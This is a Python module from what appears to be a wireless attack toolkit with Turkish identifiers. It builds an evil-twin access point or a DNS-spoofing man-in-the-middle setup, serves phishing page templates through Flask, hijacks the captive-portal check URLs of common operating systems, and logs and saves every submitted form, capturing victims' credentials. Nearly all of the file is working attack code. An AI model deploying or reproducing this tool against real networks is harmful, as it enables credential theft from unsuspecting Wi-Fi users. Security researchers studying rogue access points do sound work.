import json
import os
import shutil
import tempfile
import time
from threading import Event, Thread

try:
    from flask import Flask, request, send_from_directory
    FLASK_OK = True
except ImportError:
    FLASK_OK = False

from ..context import Module
from ..dns_spoof import DnsSpoofAlt, DNSLIB_OK
from ..iface import arac_var

TEMPLATES_DIR = "templates"


class PortalModule(Module):
    name = "portal"

    def __init__(self, ctx):
        super().__init__(ctx)
        self.ssid = None
        self.template = None
        self.channel = None
        self.hostapd_proc = None
        self.dnsmasq_proc = None
        self.flask_thread = None
        self.flask_app = None
        self.dur = Event()
        self.log_creds = True
        self.creds = []
        self._tmpdir = None
        self._hostapd_conf = None
        self._dnsmasq_conf = None
        self.dns = None
        self.mode = None

    def _templates_listesi(self):
        if not os.path.isdir(TEMPLATES_DIR):
            return []
        return [d for d in os.listdir(TEMPLATES_DIR)
                if os.path.isdir(os.path.join(TEMPLATES_DIR, d))]

    def on(self, ssid=None, template=None, channel=None, *a):
        if self.active:
            self.ctx.log("[portal] already active", "warn")
            return
        if not ssid or not template:
            tlist = ", ".join(self._templates_listesi()) or "(boş)"
            self.ctx.log("[portal] usage: module portal on <ssid> <template> [ch]", "err")
            self.ctx.log(f"[portal] mevcut şablonlar: {tlist}", "warn")
            return

        tdir = os.path.join(TEMPLATES_DIR, template)
        if not os.path.isfile(os.path.join(tdir, "index.html")):
            self.ctx.log(f"[portal] {tdir}/index.html yok", "err")
            return

        mitm = self.ctx.modules.get("mitm")
        if mitm and mitm.active:
            return self._on_mitm(ssid, tdir, channel)
        return self._on_evil_twin(ssid, tdir, channel)

    def _on_mitm(self, ssid, tdir, channel):
        if not FLASK_OK:
            self.ctx.log("[portal] Flask yok", "err")
            return
        if not DNSLIB_OK:
            self.ctx.log("[portal] dnslib yok (pip install dnslib)", "err")
            return
        self.ssid = ssid
        self.template = tdir
        self.mode = "mitm"
        self.dur.clear()
        self.active = True
        self.dns = DnsSpoofAlt(self.ctx, self.ctx.iface, spoof_ip="10.0.0.1")
        self.dns.basla()
        self.flask_app = self._flask_olustur()
        self.flask_thread = Thread(target=self._flask_calistir, daemon=True)
        self.flask_thread.start()
        self.ctx.log(f"[portal] MITM ACTIVE ssid={ssid} "
                     f"tpl={os.path.basename(tdir)} dns→10.0.0.1", "ok")
        self.ctx.log("[portal] 10.0.0.1 bu makinede olmalı "
                     "(ip addr add 10.0.0.1/24 dev <iface>)", "warn")

    def _on_evil_twin(self, ssid, tdir, channel):
        if not FLASK_OK:
            self.ctx.log("[portal] Flask yok", "err")
            return
        if not arac_var("hostapd") or not arac_var("dnsmasq"):
            self.ctx.log("[portal] hostapd/dnsmasq eksik", "err")
            return
        self.ssid = ssid
        self.template = tdir
        try:
            self.channel = int(channel) if channel else 6
        except Exception:
            self.channel = 6
        self.mode = "evil_twin"
        self._tmpdir = tempfile.mkdtemp(prefix="szr-portal-")
        self._hostapd_conf = os.path.join(self._tmpdir, "hostapd.conf")
        self._dnsmasq_conf = os.path.join(self._tmpdir, "dnsmasq.conf")
        self._hostapd_yaz()
        self._dnsmasq_yaz()
        self._ip_ayarla()
        self.dur.clear()
        try:
            self.hostapd_proc = subprocess.Popen(
                ["hostapd", self._hostapd_conf],
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except Exception as e:
            self.ctx.log(f"[portal] hostapd err: {e}", "err")
            self._temizle()
            return
        time.sleep(2)
        if self.hostapd_proc.poll() is not None:
            self.ctx.log("[portal] hostapd başlamadı", "err")
            self._temizle()
            return
        try:
            self.dnsmasq_proc = subprocess.Popen(
                ["dnsmasq", "-C", self._dnsmasq_conf, "-d"],
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except Exception as e:
            self.ctx.log(f"[portal] dnsmasq err: {e}", "err")
            self._temizle()
            return
        self.active = True
        self.flask_app = self._flask_olustur()
        self.flask_thread = Thread(target=self._flask_calistir, daemon=True)
        self.flask_thread.start()
        self.ctx.log(f"[portal] EVIL TWIN ACTIVE ssid={ssid} "
                     f"tpl={os.path.basename(tdir)} ch={self.channel}", "ok")

    def _hostapd_yaz(self):
        conf = f"""interface={self.ctx.iface}
driver=nl80211
ssid={self.ssid}
hw_mode=g
channel={self.channel}
wmm_enabled=1
auth_algs=1
wpa=2
wpa_passphrase=labpassword
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
"""
        with open(self._hostapd_conf, "w") as f:
            f.write(conf)

    def _dnsmasq_yaz(self):
        conf = f"""interface={self.ctx.iface}
dhcp-range=10.0.0.10,10.0.0.100,12h
dhcp-option=3,10.0.0.1
dhcp-option=6,10.0.0.1
address=/#/10.0.0.1
no-resolv
"""
        with open(self._dnsmasq_conf, "w") as f:
            f.write(conf)

    def _ip_ayarla(self):
        import subprocess
        try:
            subprocess.run(["ip", "addr", "flush", "dev", self.ctx.iface],
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            subprocess.run(["ip", "addr", "add", "10.0.0.1/24",
                            "dev", self.ctx.iface], check=False,
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            subprocess.run(["ip", "link", "set", self.ctx.iface, "up"],
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except Exception as e:
            self.ctx.log(f"[portal] ip ayar err: {e}", "warn")

    def _flask_olustur(self):
        app = Flask(__name__, static_folder=None)
        tdir = self.template
        creds = self.creds
        log_creds = self.log_creds
        ctx_log = self.ctx.log

        @app.route("/", defaults={"path": ""})
        @app.route("/<path:path>")
        def catch_all(path):
            if request.method == "POST":
                if log_creds:
                    data = dict(request.form)
                    creds.append((time.time(), request.remote_addr, data))
                    ctx_log(f"[portal] FORM {request.remote_addr} {data}", "warn")
                return ("<html><body><h2>Teşekkürler</h2>"
                        "<p>Bağlantı doğrulanıyor...</p></body></html>", 200)
            fp = os.path.join(tdir, path) if path else os.path.join(tdir, "index.html")
            if os.path.isfile(fp):
                return send_from_directory(tdir, path or "index.html")
            return send_from_directory(tdir, "index.html")

        @app.route("/generate_204")
        @app.route("/hotspot-detect.html")
        @app.route("/connecttest.txt")
        @app.route("/ncsi.txt")
        def captive_check():
            return send_from_directory(tdir, "index.html")

        return app

    def _flask_calistir(self):
        try:
            self.flask_app.run(host="0.0.0.0", port=80, debug=False,
                               use_reloader=False, threaded=True)
        except Exception as e:
            self.ctx.log(f"[portal] flask err: {e}", "err")

    def off(self):
        if not self.active:
            return
        self.dur.set()
        if self.dns:
            self.dns.durdur()
            self.dns = None
        for p in (self.hostapd_proc, self.dnsmasq_proc):
            if p and p.poll() is None:
                try:
                    p.terminate()
                except Exception:
                    pass
        self.active = False
        self._temizle()
        self.ctx.log(f"[portal] stopped (mode={self.mode})", "ok")

    def _temizle(self):
        try:
            if self._tmpdir and os.path.isdir(self._tmpdir):
                shutil.rmtree(self._tmpdir, ignore_errors=True)
        except Exception:
            pass

    def save_creds(self, path):
        if not self.creds:
            self.ctx.log("[portal] form verisi yok", "warn")
            return
        try:
            with open(path, "w", encoding="utf-8") as f:
                for ts, ip, data in self.creds:
                    f.write(f"{ts}\t{ip}\t{json.dumps(data)}\n")
            self.ctx.log(f"[portal] {len(self.creds)} form → {path}", "ok")
        except Exception as e:
            self.ctx.log(f"[portal] save err: {e}", "err")

    def status(self):
        if self.active:
            extra = f" dns={self.dns.sayac}" if self.dns else ""
            return (f"active ({self.mode}) ssid={self.ssid} "
                    f"tpl={os.path.basename(self.template or '')}{extra}")
        return "off"
